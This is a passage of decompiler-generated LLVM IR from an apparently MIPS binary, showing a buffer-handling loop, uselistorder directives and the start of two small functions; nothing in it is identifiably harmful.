  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v0_403de0 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v0_403de0, i32* %a0.global-to-local, align 4
  store i32 5, i32* %a1.global-to-local, align 4
  store i32 10, i32* @a2, align 4
  %v0_403df0.pre = load i32, i32* @v1, align 4
  br label %dec_label_pc_403df0

dec_label_pc_403df0:                              ; preds = %dec_label_pc_403cf0, %dec_label_pc_403cf4
  %v1_403df0 = phi i32 [ 2, %dec_label_pc_403cf0 ], [ %v2_403dd4, %dec_label_pc_403cf4 ]
  %v0_403df0 = phi i32 [ %v0_403cf0, %dec_label_pc_403cf0 ], [ %v0_403df0.pre, %dec_label_pc_403cf4 ]
  %v2_403df0 = icmp eq i32 %v0_403df0, %v1_403df0
  br i1 %v2_403df0, label %dec_label_pc_403df4, label %dec_label_pc_403f60

dec_label_pc_403df4:                              ; preds = %dec_label_pc_403df0
  %v3_403df8 = load i32, i32* %v2_403df8, align 4
  store i32 21, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_403df8)
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  store i32 %v2_403998, i32* %s1.global-to-local, align 4
  store i32 1024, i32* @a2, align 4
  store i32 %v2_403998, i32* @a0, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  %v4_403e1c = call i32 @function_404434(i32 %v2_403998, i32 0, i32 1024)
  store i32 %v4_403e1c, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  store i32 %v2_403998, i32* %a0.global-to-local, align 4
  %v3_403e30 = load i32, i32* @global_var_4492ec.198, align 4
  store i32 %v3_403e30, i32* @t9, align 4
  store i32 ptrtoint ([621 x i8]* @global_var_408964.277 to i32), i32* %a1.global-to-local, align 4
  %v8_403e38 = call i32 @function_4043d0(i8* %v7_403c6c, i32 ptrtoint ([621 x i8]* @global_var_408964.277 to i32))
  store i32 %v8_403e38, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  store i32 %v2_403998, i32* %a0.global-to-local, align 4
  store i32 ptrtoint ([195 x i8]* @global_var_40861c.273 to i32), i32* @a1, align 4
  %v8_403e54 = call i32 @function_404370(i8* %v7_403c6c, i32 ptrtoint ([195 x i8]* @global_var_40861c.273 to i32))
  store i32 %v8_403e54, i32* @v0, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v0_403e68 = load i32, i32* %s2.global-to-local, align 4
  %v1_403e68 = add i32 %v0_403e68, 8
  %v2_403e68 = inttoptr i32 %v1_403e68 to i32*
  %v3_403e68 = load i32, i32* %v2_403e68, align 4
  store i32 %v3_403e68, i32* @s0, align 4
  store i32 %v2_403998, i32* %a0.global-to-local, align 4
  %v4_403e6c = call i32 @function_40434c(i32 %v2_403998)
  store i32 %v4_403e6c, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  store i32 %v2_403998, i32* %a1.global-to-local, align 4
  %v3_403e7c = load i32, i32* @global_var_449420.211, align 4
  store i32 %v3_403e7c, i32* @t9, align 4
  %v0_403e80 = load i32, i32* @s0, align 4
  store i32 %v0_403e80, i32* %a0.global-to-local, align 4
  store i32 %v4_403e6c, i32* %a2.global-to-local, align 4
  store i32 16384, i32* %a3.global-to-local, align 4
  %v6_403e88 = call i32 @function_405a80(i32 %v0_403e80, i32* nonnull %stack_var_-2596, i32 %v4_403e6c, i32 16384)
  store i32 %v6_403e88, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v3_403e98 = load i32, i32* @global_var_449404.182, align 4
  store i32 %v3_403e98, i32* @t9, align 4
  store i32 21, i32* %a0.global-to-local, align 4
  %v2_403ea0 = call i32 @function_400e4c(i32 21)
  store i32 %v2_403ea0, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v0_403eac = load i32, i32* %s2.global-to-local, align 4
  store i32 %v0_403eac, i32* %a0.global-to-local, align 4
  store i32 6, i32* %a1.global-to-local, align 4
  %v0_403eb8.pre = load i32, i32* @s7, align 4
  br label %dec_label_pc_403eb8

dec_label_pc_403eb8:                              ; preds = %dec_label_pc_403c10, %dec_label_pc_403df4
  %v1_403eb8 = phi i32 [ 2, %dec_label_pc_403c10 ], [ %v2_403ea0, %dec_label_pc_403df4 ]
  %v0_403eb8 = phi i32 [ %v0_403c14, %dec_label_pc_403c10 ], [ %v0_403eb8.pre, %dec_label_pc_403df4 ]
  %v2_403eb8 = icmp eq i32 %v0_403eb8, %v1_403eb8
  br i1 %v2_403eb8, label %dec_label_pc_403ebc, label %dec_label_pc_403f60

dec_label_pc_403ebc:                              ; preds = %dec_label_pc_403eb8
  %v3_403ec0 = load i32, i32* @global_var_44932c.178, align 4
  store i32 %v3_403ec0, i32* @t9, align 4
  store i32 21, i32* %a0.global-to-local, align 4
  %v2_403ec8 = call i32 @function_400d04(i32 21)
  store i32 %v2_403ec8, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 1024, i32* @a2, align 4
  store i32 %v2_403998, i32* @a0, align 4
  %v6_403ee4 = call i32 @function_404434(i32 %v2_403998, i32 0, i32 1024)
  store i32 %v6_403ee4, i32* @v0, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v0_403ef8 = load i32, i32* %s2.global-to-local, align 4
  %v1_403ef8 = add i32 %v0_403ef8, 8
  %v2_403ef8 = inttoptr i32 %v1_403ef8 to i32*
  %v3_403ef8 = load i32, i32* %v2_403ef8, align 4
  store i32 %v3_403ef8, i32* %s1.global-to-local, align 4
  store i32 %v2_403998, i32* %a0.global-to-local, align 4
  %v4_403efc = call i32 @function_40434c(i32 %v2_403998)
  store i32 %v4_403efc, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  store i32 %v2_403998, i32* %a1.global-to-local, align 4
  %v3_403f0c = load i32, i32* @global_var_449420.211, align 4
  store i32 %v3_403f0c, i32* @t9, align 4
  %v0_403f10 = load i32, i32* %s1.global-to-local, align 4
  store i32 %v0_403f10, i32* %a0.global-to-local, align 4
  store i32 %v4_403efc, i32* %a2.global-to-local, align 4
  store i32 16384, i32* %a3.global-to-local, align 4
  %v6_403f18 = call i32 @function_405a80(i32 %v0_403f10, i32* nonnull %stack_var_-2596, i32 %v4_403efc, i32 16384)
  store i32 %v6_403f18, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v3_403f28 = load i32, i32* @global_var_449404.182, align 4
  store i32 %v3_403f28, i32* @t9, align 4
  store i32 21, i32* %a0.global-to-local, align 4
  %v2_403f30 = call i32 @function_400e4c(i32 21)
  store i32 %v2_403f30, i32* %v0.global-to-local, align 4
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v0_403f3c = load i32, i32* %s2.global-to-local, align 4
  store i32 %v0_403f3c, i32* %a0.global-to-local, align 4
  store i32 7, i32* %a1.global-to-local, align 4
  store i32 30, i32* @a2, align 4
  %v3_403f48 = load i32, i32* bitcast (i32** @global_var_4491f0.18 to i32*), align 4
  %v1_403f50 = add i32 %v3_403f48, 12488
  call void @__pseudo_call(i32 %v1_403f50)
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_403f60

dec_label_pc_403f60:                              ; preds = %dec_label_pc_403eb8, %dec_label_pc_403df0, %dec_label_pc_403bbc, %dec_label_pc_403ebc
  %v0_403f60 = load i32, i32* %s2.global-to-local, align 4
  %v1_403f60 = add i32 %v0_403f60, 8
  %v2_403f60 = inttoptr i32 %v1_403f60 to i32*
  %v3_403f60 = load i32, i32* %v2_403f60, align 4
  store i32 %v3_403f60, i32* %v1.global-to-local, align 4
  %v1_403f68 = udiv i32 %v3_403f60, 32
  %v1_403f6c = mul nuw nsw i32 %v1_403f68, 4
  %v0_403f70 = load i32, i32* @sp, align 4
  %v2_403f70 = add i32 %v0_403f70, %v1_403f6c
  store i32 %v2_403f70, i32* %v0.global-to-local, align 4
  %v1_403f74 = add i32 %v2_403f70, 108
  %v2_403f74 = inttoptr i32 %v1_403f74 to i32*
  %v3_403f74 = load i32, i32* %v2_403f74, align 4
  %v2_403f7c = lshr i32 %v3_403f74, %v3_403f60
  %v1_403f80 = urem i32 %v2_403f7c, 2
  store i32 %v1_403f80, i32* %v0.global-to-local, align 4
  %v1_403f84 = icmp eq i32 %v1_403f80, 0
  br i1 %v1_403f84, label %dec_label_pc_4040c4, label %dec_label_pc_403f88

dec_label_pc_403f88:                              ; preds = %dec_label_pc_403f60
  %v1_403f8c = add i32 %v0_403f60, 16
  %v2_403f8c = inttoptr i32 %v1_403f8c to i8*
  %v3_403f8c = load i8, i8* %v2_403f8c, align 1
  %v4_403f8c = zext i8 %v3_403f8c to i32
  store i32 %v4_403f8c, i32* %v0.global-to-local, align 4
  %v1_403f94 = icmp eq i8 %v3_403f8c, 0
  %v3_403f94 = add i32 %v0_403f60, 18
  store i32 %v3_403f94, i32* %a1.global-to-local, align 4
  br i1 %v1_403f94, label %dec_label_pc_4040c4, label %dec_label_pc_403f98

dec_label_pc_403f98:                              ; preds = %dec_label_pc_403f88
  %v1_403f9c = add i32 %v0_403f60, 530
  %v2_403f9c = inttoptr i32 %v1_403f9c to i16*
  %v3_403f9c = load i16, i16* %v2_403f9c, align 2
  %v4_403f9c = zext i16 %v3_403f9c to i32
  store i32 %v4_403f9c, i32* %v0.global-to-local, align 4
  %v0_403fa0 = load i32, i32* %s3.global-to-local, align 4
  %v1_403fa0 = inttoptr i32 %v0_403fa0 to i32*
  store i32 0, i32* %v1_403fa0, align 4
  %v0_403fa4 = load i32, i32* %gp.global-to-local, align 4
  %v1_403fa4 = add i32 %v0_403fa4, -32036
  %v2_403fa4 = inttoptr i32 %v1_403fa4 to i32*
  %v3_403fa4 = load i32, i32* %v2_403fa4, align 4
  %v0_403fa8 = load i32, i32* %s2.global-to-local, align 4
  %v1_403fa8 = add i32 %v0_403fa8, 8
  %v2_403fa8 = inttoptr i32 %v1_403fa8 to i32*
  %v3_403fa8 = load i32, i32* %v2_403fa8, align 4
  store i32 %v3_403fa8, i32* %a0.global-to-local, align 4
  %v1_403fb0 = load i32, i32* %v0.global-to-local, align 4
  %v2_403fb0 = sub i32 512, %v1_403fb0
  store i32 %v2_403fb0, i32* @a2, align 4
  %v0_403fb4 = load i32, i32* %a1.global-to-local, align 4
  %v2_403fb4 = add i32 %v0_403fb4, %v1_403fb0
  store i32 %v2_403fb4, i32* %a1.global-to-local, align 4
  store i32 16384, i32* @a3, align 4
  call void @__pseudo_call(i32 %v3_403fa4)
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v0_403fc4 = load i32, i32* %v0.global-to-local, align 4
  %v1_403fc4 = icmp eq i32 %v0_403fc4, 0
  store i32 %v0_403fc4, i32* %a0.global-to-local, align 4
  br i1 %v1_403fc4, label %dec_label_pc_403fc8, label %dec_label_pc_40406c

dec_label_pc_403fc8:                              ; preds = %dec_label_pc_403f98
  %v0_403fcc = load i32, i32* %s2.global-to-local, align 4
  %v1_403fcc = add i32 %v0_403fcc, 16
  %v2_403fcc = inttoptr i32 %v1_403fcc to i8*
  %v3_403fcc = load i8, i8* %v2_403fcc, align 1
  %v4_403fcc = zext i8 %v3_403fcc to i32
  store i32 %v4_403fcc, i32* %v1.global-to-local, align 4
  store i32 4, i32* %v0.global-to-local, align 4
  %v2_403fd4 = icmp eq i8 %v3_403fcc, 4
  store i32 0, i32* %a1.global-to-local, align 4
  br i1 %v2_403fd4, label %dec_label_pc_403fd8, label %dec_label_pc_404018

dec_label_pc_403fd8:                              ; preds = %dec_label_pc_403fc8
  %v3_403fdc = load i32, i32* bitcast (i32** @global_var_4491f0.18 to i32*), align 4
  %v1_403fe4 = add i32 %v3_403fdc, 12536
  store i32 %v0_403fcc, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_403fe4)
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v3_403ff8 = load i32, i32* bitcast (i32** @global_var_4491f0.18 to i32*), align 4
  %v1_404000 = add i32 %v3_403ff8, 12664
  %v1_404004 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_404004, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_404000)
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  store i32 1, i32* %v0.global-to-local, align 4
  %v0_40401c.pr = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_404018

dec_label_pc_404018:                              ; preds = %dec_label_pc_403fc8, %dec_label_pc_403fd8
  %v0_40401c = phi i32 [ %v4_403fcc, %dec_label_pc_403fc8 ], [ %v0_40401c.pr, %dec_label_pc_403fd8 ]
  %v2_40401c = icmp eq i32 %v0_40401c, 5
  store i32 131, i32* %v0.global-to-local, align 4
  br i1 %v2_40401c, label %dec_label_pc_404020, label %dec_label_pc_404064

dec_label_pc_404020:                              ; preds = %dec_label_pc_404018
  %v3_404024 = load i32, i32* bitcast (i32** @global_var_4491f0.18 to i32*), align 4
  %v1_40402c = add i32 %v3_404024, 12536
  %v1_404030 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_404030, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_40402c)
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v3_404040 = load i32, i32* bitcast (i32** @global_var_4491f0.18 to i32*), align 4
  %v1_404048 = add i32 %v3_404040, 12664
  %v1_40404c = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_40404c, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_404048)
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  store i32 2, i32* %v0.global-to-local, align 4
  %v2_404060 = load i32, i32* %s2.global-to-local, align 4
  %v3_404060 = add i32 %v2_404060, 17
  %v4_404060 = inttoptr i32 %v3_404060 to i8*
  store i8 2, i8* %v4_404060, align 1
  %v0_404068.pre = load i32, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_404064

dec_label_pc_404064:                              ; preds = %dec_label_pc_404018, %dec_label_pc_404020
  %v0_404068 = phi i32 [ 131, %dec_label_pc_404018 ], [ %v0_404068.pre, %dec_label_pc_404020 ]
  %v1_404068 = load i32, i32* %s3.global-to-local, align 4
  %v2_404068 = inttoptr i32 %v1_404068 to i32*
  store i32 %v0_404068, i32* %v2_404068, align 4
  %v0_404070.pr = load i32, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_40406c

dec_label_pc_40406c:                              ; preds = %dec_label_pc_403f98, %dec_label_pc_404064
  %v0_404070 = phi i32 [ %v0_403fc4, %dec_label_pc_403f98 ], [ %v0_404070.pr, %dec_label_pc_404064 ]
  %v2_404070 = icmp eq i32 %v0_404070, -1
  store i32 11, i32* %v0.global-to-local, align 4
  br i1 %v2_404070, label %dec_label_pc_404074, label %dec_label_pc_40406c.dec_label_pc_4040a8_crit_edge

dec_label_pc_40406c.dec_label_pc_4040a8_crit_edge: ; preds = %dec_label_pc_40406c
  %v0_4040a8.pre = load i32, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_4040a8

dec_label_pc_404074:                              ; preds = %dec_label_pc_40406c
  %v0_404078 = load i32, i32* %s3.global-to-local, align 4
  %v1_404078 = inttoptr i32 %v0_404078 to i32*
  %v2_404078 = load i32, i32* %v1_404078, align 4
  store i32 %v2_404078, i32* %v1.global-to-local, align 4
  %v2_404080 = icmp eq i32 %v2_404078, 11
  br i1 %v2_404080, label %dec_label_pc_4040c4, label %dec_label_pc_404074.dec_label_pc_404088_crit_edge

dec_label_pc_404074.dec_label_pc_404088_crit_edge: ; preds = %dec_label_pc_404074
  %v0_404088.pre = load i32, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_404088

dec_label_pc_404088:                              ; preds = %dec_label_pc_404074.dec_label_pc_404088_crit_edge, %dec_label_pc_403bdc
  %v0_404088 = phi i32 [ %v0_404088.pre, %dec_label_pc_404074.dec_label_pc_404088_crit_edge ], [ %v2_403268, %dec_label_pc_403bdc ]
  %v1_404088 = add i32 %v0_404088, -32736
  %v2_404088 = inttoptr i32 %v1_404088 to i32*
  %v3_404088 = load i32, i32* %v2_404088, align 4
  %v0_40408c = load i32, i32* %s2.global-to-local, align 4
  store i32 %v0_40408c, i32* %a0.global-to-local, align 4
  %v1_404090 = add i32 %v3_404088, 12536
  store i32 0, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_404090)
  store i32 %v2_403268, i32* %gp.global-to-local, align 4
  %v0_4040b4.pre = load i32, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_4040a8

dec_label_pc_4040a8:                              ; preds = %dec_label_pc_40406c.dec_label_pc_4040a8_crit_edge, %dec_label_pc_404088
  %v0_4040b4 = phi i32 [ %v0_404070, %dec_label_pc_40406c.dec_label_pc_4040a8_crit_edge ], [ %v0_4040b4.pre, %dec_label_pc_404088 ]
  %v0_4040a8 = phi i32 [ %v0_4040a8.pre, %dec_label_pc_40406c.dec_label_pc_4040a8_crit_edge ], [ %v2_403268, %dec_label_pc_404088 ]
  %v1_4040a8 = add i32 %v0_4040a8, -32020
  %v2_4040a8 = inttoptr i32 %v1_4040a8 to i32*
  %v3_4040a8 = load i32, i32* %v2_4040a8, align 4
  store i32 %v3_4040a8, i32* %v1.global-to-local, align 4
  %v0_4040ac = load i32, i32* %s2.global-to-local, align 4
  %v1_4040ac = add i32 %v0_4040ac, 530
  %v2_4040ac = inttoptr i32 %v1_4040ac to i16*
  %v3_4040ac = load i16, i16* %v2_4040ac, align 2
  %v4_4040ac = zext i16 %v3_4040ac to i32
  store i32 %v4_4040ac, i32* %v0.global-to-local, align 4
  %v1_4040b0 = inttoptr i32 %v3_4040a8 to i32*
  %v2_4040b0 = load i32, i32* %v1_4040b0, align 4
  store i32 %v2_4040b0, i32* %v1.global-to-local, align 4
  %v2_4040b4 = add i32 %v4_4040ac, %v0_4040b4
  store i32 %v2_4040b4, i32* %v0.global-to-local, align 4
  %v1_4040b8 = trunc i32 %v2_4040b4 to i16
  store i16 %v1_4040b8, i16* %v2_4040ac, align 2
  %v0_4040c0 = load i32, i32* %v1.global-to-local, align 4
  %v1_4040c0 = load i32, i32* %s2.global-to-local, align 4
  %v2_4040c0 = add i32 %v1_4040c0, 532
  %v3_4040c0 = inttoptr i32 %v2_4040c0 to i32*
  store i32 %v0_4040c0, i32* %v3_4040c0, align 4
  br label %dec_label_pc_4040c4

dec_label_pc_4040c4:                              ; preds = %dec_label_pc_404074, %dec_label_pc_403f88, %dec_label_pc_403f60, %dec_label_pc_403b98, %dec_label_pc_4040a8
  %v3_4040c4 = load i32, i32* %stack_var_-2928, align 4
  %v1_4040cc = add i32 %v3_4040c4, 1
  store i32 %v1_4040cc, i32* %a0.global-to-local, align 4
  %v1_4040d0 = icmp slt i32 %v1_4040cc, 160
  %v2_4040d0 = zext i1 %v1_4040d0 to i32
  store i32 %v2_4040d0, i32* %v0.global-to-local, align 4
  store i32 %v1_4040cc, i32* %stack_var_-2928, align 4
  br i1 %v1_4040d0, label %dec_label_pc_403b98, label %dec_label_pc_4040e4

dec_label_pc_4040e4:                              ; preds = %dec_label_pc_4040c4, %dec_label_pc_4032bc, %dec_label_pc_403260
  store i32 %v0_403270, i32* @ra, align 4
  store i32 %v0_403274, i32* @fp, align 4
  store i32 %v0_403278, i32* @s7, align 4
  store i32 %v0_40327c, i32* @s6, align 4
  store i32 %v0_403284, i32* @s4, align 4
  store i32 %v0_403294, i32* @s0, align 4
  %v4_40410c = load i32, i32* %v0.global-to-local, align 4
  ret i32 %v4_40410c

; uselistorder directives
  uselistorder i32 %v1_4040cc, { 1, 2, 3, 0 }
  uselistorder i32 %v1_403f80, { 1, 0 }
  uselistorder i32 %v3_403f60, { 1, 0, 2 }
  uselistorder i32 %v4_403efc, { 1, 0, 2 }
  uselistorder i32 %v4_403e6c, { 1, 0, 2 }
  uselistorder i32 %v4_403da0, { 1, 0, 2 }
  uselistorder i32 %v4_403ca0, { 1, 0, 2 }
  uselistorder i32 %v3_403bb0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_403ba4, { 1, 0 }
  uselistorder i8* %v7_403c6c, { 1, 0, 5, 4, 3, 2, 6, 7 }
  uselistorder i32 %v1_403b20, { 1, 2, 3, 0 }
  uselistorder i32 %stack_var_-56.1, { 0, 2, 1, 3 }
  uselistorder i32 %v4_403ac0, { 2, 1, 0 }
  uselistorder i32 %v1_403abc, { 2, 0, 1 }
  uselistorder i32 %v1_403adc, { 2, 3, 1, 0 }
  uselistorder i32 %stack_var_-56.0, { 3, 4, 5, 1, 0, 2 }
  uselistorder i32 %v1_4039c0, { 1, 0 }
  uselistorder i32 %v2_403ab8, { 1, 0, 2 }
  uselistorder i32 %v1_4039a0, { 1, 2, 0 }
  uselistorder i32 %v2_403998, { 0, 2, 1, 4, 3, 5, 7, 6, 8, 9, 11, 10, 12, 13, 15, 14, 16, 17, 18, 19, 21, 20, 22, 24, 23, 25, 26, 28, 27, 29, 30 }
  uselistorder i32 %v1_40398c, { 0, 2, 3, 1 }
  uselistorder i32 %v2_403980, { 1, 0, 2 }
  uselistorder i32 %v0_403820, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_403760, { 1, 0, 2 }
  uselistorder i32 %v4_4036e4.pre-phi, { 1, 0 }
  uselistorder i32 %v4_4036d4, { 2, 1, 0 }
  uselistorder i32 %v0_4036d4, { 0, 2, 1 }
  uselistorder i32 %v1_4036b0, { 1, 0 }
  uselistorder i32 %v2_4035c8, { 1, 0, 2 }
  uselistorder i32 %v4_403580, { 1, 0 }
  uselistorder i32 %v2_403520, { 1, 0 }
  uselistorder i32 %v1_40351c, { 1, 0 }
  uselistorder i32 %v0_403504, { 1, 0 }
  uselistorder i32 %v0_40346c, { 1, 0, 2 }
  uselistorder i32 %v3_403304, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v2_403268, { 0, 28, 1, 27, 26, 25, 24, 23, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 22, 21, 63, 62, 61, 2, 60, 59, 20, 19, 71, 70, 69, 68, 67, 66, 65, 64, 18, 17, 16, 73, 72, 15, 14, 13, 12, 11, 3, 77, 76, 75, 74, 10, 9, 8, 7, 6, 5, 4, 78 }
  uselistorder i32* %stack_var_-2892, { 0, 2, 3, 1, 4 }
  uselistorder i32* %stack_var_-2928, { 1, 2, 3, 4, 5, 14, 6, 7, 8, 9, 10, 11, 0, 15, 12, 13 }
  uselistorder i32* %stack_var_-2596, { 4, 3, 2, 0, 1, 5 }
  uselistorder i32* %stack_var_-2916, { 1, 0 }
  uselistorder i32* %v1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32* %v0.global-to-local, { 108, 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 45, 38, 39, 40, 43, 41, 42, 44, 70, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 71, 73, 72, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 102, 101, 103, 104, 105, 106, 107, 110, 109 }
  uselistorder i32* %s1.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11 }
  uselistorder i32* %gp.global-to-local, { 0, 6, 5, 1, 2, 3, 4, 7, 38, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 40, 41, 47, 42, 43, 44, 45, 46, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 73, 69, 70, 71, 72, 74, 75, 76, 77, 78, 79, 80, 81 }
  uselistorder i32* %a2.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %a1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 26, 27, 22, 23, 24, 25, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38 }
  uselistorder i32* %a0.global-to-local, { 1, 2, 3, 8, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 70, 69, 71, 72, 73, 74, 75, 76, 77, 78, 79, 81, 80, 0 }
  uselistorder i32 (i32)* @function_40434c, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([195 x i8]* @global_var_40861c.273 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 (i32, i32, i32)* @function_404434, { 4, 3, 2, 1, 0 }
  uselistorder i32 1024, { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 (i32)* @function_400d04, { 3, 2, 1, 0 }
  uselistorder i32 21, { 1, 8, 2, 9, 3, 10, 11, 4, 12, 5, 13, 6, 14, 7, 15, 0, 16 }
  uselistorder i32 4103, { 1, 0, 2 }
  uselistorder i32 65535, { 6, 2, 7, 0, 8, 3, 9, 1, 4, 5 }
  uselistorder i32 17, { 2, 3, 4, 5, 6, 0, 7, 1, 8 }
  uselistorder i8 4, { 1, 0 }
  uselistorder i32 11, { 1, 6, 3, 4, 7, 0, 8, 9, 2, 10, 5, 11 }
  uselistorder i32 16384, { 12, 0, 13, 1, 14, 2, 15, 3, 16, 4, 17, 5, 18, 6, 19, 7, 20, 8, 21, 22, 9, 23, 10, 24, 11, 25 }
  uselistorder i32 (i32)* @function_406580, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_400e4c, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_400f98, { 0, 3, 2, 1 }
  uselistorder i32 27, { 2, 1, 3, 4, 0, 5 }
  uselistorder i32 536, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 (i32*)* @function_4050e0, { 0, 2, 1 }
  uselistorder i32 ()* @function_404b70, { 1, 2, 0 }
  uselistorder i32* @s6, { 1, 2, 3, 0, 4, 5, 6, 7 }
  uselistorder i32* @s7, { 2, 0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder label %dec_label_pc_4040c4, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_4040a8, { 1, 0 }
  uselistorder label %dec_label_pc_40406c, { 1, 0 }
  uselistorder label %dec_label_pc_404064, { 1, 0 }
  uselistorder label %dec_label_pc_404018, { 1, 0 }
  uselistorder label %dec_label_pc_403f60, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_403eb8, { 1, 0 }
  uselistorder label %dec_label_pc_403df0, { 1, 0 }
  uselistorder label %dec_label_pc_403cf0, { 1, 0 }
  uselistorder label %dec_label_pc_403b4c, { 1, 0 }
  uselistorder label %dec_label_pc_403af0, { 1, 0 }
  uselistorder label %dec_label_pc_403ab8, { 1, 0 }
  uselistorder label %dec_label_pc_403aa0, { 1, 0 }
  uselistorder label %dec_label_pc_403a54, { 1, 0 }
  uselistorder label %dec_label_pc_4036e4, { 1, 0 }
  uselistorder label %dec_label_pc_4034bc, { 1, 0 }
  uselistorder label %dec_label_pc_403464, { 1, 0 }
  uselistorder label %dec_label_pc_4033f4, { 1, 0 }
  uselistorder label %dec_label_pc_4033e4, { 0, 2, 1 }
}

define i32 @function_404114() local_unnamed_addr {
dec_label_pc_404114:
  %v3_404120 = load i32, i32* bitcast (i32** @global_var_44941c.286 to i32*), align 4
  %v3_404124 = load i32, i32* @global_var_4493e4.7, align 4
  store i32 %v3_404124, i32* @t9, align 4
  %v3_40412c = call i32 @function_404c90(i32 %v3_404120, i32 9)
  ret i32 %v3_40412c
}

define i32 @function_404134(i32 %arg1) local_unnamed_addr {
dec_label_pc_404134:
  %gp.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp11 = alloca i32, align 4
  %tmp12 = alloca i32, align 4
  %tmp13 = alloca i32, align 4
  %tmp14 = alloca i32, align 4
  %v1_40413c = load i32, i32* @t9, align 4
  %v2_40413c = add i32 %v1_40413c, 315548
  store i32 %v2_40413c, i32* %gp.global-to-local, align 4
  %v0_404150 = load i32, i32* @s0, align 4
  %v3_404158 = load i32, i32* @global_var_449380.4, align 4
  store i32 %arg1, i32* %s2.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_404158)
